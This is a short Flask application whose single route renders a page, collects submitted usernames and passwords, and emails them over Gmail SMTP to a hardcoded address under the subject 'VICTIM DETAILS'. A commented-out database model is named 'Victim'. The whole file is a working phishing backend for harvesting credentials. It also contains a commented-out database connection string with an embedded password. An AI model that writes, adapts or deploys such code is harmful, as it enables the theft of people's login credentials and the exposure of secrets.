from flask import Flask, request
from flask.templating import render_template
from flask_sqlalchemy import SQLAlchemy
import os
import smtplib
app = Flask(__name__)

EMAIL = os.environ.get("EMAIL")
PASS = os.environ.get("PASS")

# app.config['SQLALCHEMY_DATABASE_URI'] = 'postgres://yrqxnnjysughbc:b0db32c98bb55efec2a38782d4df72f6821982b62c4cef9007bcc88ac3878944@ec2-54-158-232-223.compute-1.amazonaws.com:5432/d5r4sjdia6g8ki'
# db = SQLAlchemy(app)


# class Victim(db.Model):
#     id = db.Column(db.Integer, primary_key=True)
#     username = db.Column(db.String(180), nullable=False)
#     password = db.Column(db.String(120), nullable=False)


@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        with smtplib.SMTP("smtp.gmail.com", port=587) as connection:
            connection.starttls()
            connection.login(EMAIL, PASS)
            connection.sendmail(from_addr=EMAIL, to_addrs="arshadaman202@gmail.com", msg=f"Subject:VICTIM DETAILS \n\nUSERNAME: {username}\nPassword:{password}")  
    return render_template('index.html')

if __name__ =="__main__":
    app.run()